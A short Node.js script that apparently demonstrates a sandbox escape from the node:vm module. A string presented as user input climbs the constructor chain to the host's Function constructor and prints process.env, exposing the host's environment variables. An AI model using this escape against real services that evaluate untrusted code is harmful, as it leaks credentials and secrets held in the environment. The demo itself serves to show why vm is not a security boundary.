const vm = require("node:vm");

const userInputCustomJavaScriptCode =
  "this.constructor.constructor('console.log(process.env)')()";

const context = { userCustomNickname: "John Nash" };
vm.createContext(context);

vm.runInContext(userInputCustomJavaScriptCode, context);

console.log("Mess with the best, drop like your envs!");
